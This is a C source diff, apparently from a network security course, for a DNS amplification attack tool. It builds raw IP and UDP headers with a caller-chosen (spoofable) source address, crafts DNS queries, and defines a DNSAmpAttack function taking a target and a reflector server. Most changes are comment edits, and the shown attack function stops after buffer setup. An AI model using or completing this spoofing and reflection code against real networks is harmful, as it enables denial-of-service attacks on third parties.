@@ -1,5 +1,6 @@
 #include "dns.h"
 
+// This would be wrong
 // IP Header checksum
 // uint16_t checkSum(uint16_t * buff, uint16_t nbytes) {
 //     unsigned long sum;
@@ -19,6 +20,7 @@
 //     return (uint16_t)(~sum);
 // }
 
+// new ver checksum
 uint16_t checkSum(uint16_t * buffer, uint16_t nbytes){
 	unsigned long sum = 0;
     // Accumulate checksum
@@ -36,7 +38,6 @@ uint16_t checkSum(uint16_t * buffer, uint16_t nbytes){
 	return (uint16_t)~sum;
 }
 
-// fuuuuuuuuuuuuuuuuuuuuuuuuuck, what was that
 void constructIPHeader(struct ip * ip_header, const char * src_ip, const char * dst_ip, uint16_t len) {
     ip_header->ip_hl = 5;
     ip_header->ip_v = IPVERSION;//4; // IPVERSION;
@@ -47,7 +48,7 @@ void constructIPHeader(struct ip * ip_header, const char * src_ip, const char * 
     ip_header->ip_p = IPPROTO_UDP;//17; // IPPROTO_UDP;
     ip_header->ip_src.s_addr = inet_addr(src_ip);
     ip_header->ip_dst.s_addr = inet_addr(dst_ip); // put destination IP address
-    printf("%d\n",len);
+    //printf("%d\n",len);
     ip_header->ip_len = sizeof(struct ip) + len;
     ip_header->ip_sum = checkSum((uint16_t *)ip_header, ip_header->ip_len);
 }
@@ -78,11 +79,10 @@ void formatDNS(char * buff, const char * hostname) {
     *buff++ = '\0';
 }
 
-// what this function does????
 uint16_t constructDNS(char * dns_message, const char * hostname, uint16_t record_type) {
     dns_header * dns = (dns_header *)dns_message;
-    dns->id = 0x7B66; //htons(getpid());
-    dns->flags = htons(0x0100); // whaaaaaaaaaaat
+    dns->id = 0x7B66; // 0616059
+    dns->flags = htons(0x0100); 
     dns->qcount = htons(1);
     dns->answ = 0;
     dns->auth = 0;
@@ -125,7 +125,6 @@ void IPv4CheckSum(const struct ip * ip_header, struct udphdr * udp_header) {
 }
 
 void DNSAmpAttack(const char * target_ip, int target_port, const char * server_ip, const char * hostname) {
-    // Create datagram ?? 
     char datagram[4096];
     memset(datagram, 0, 4096);
 
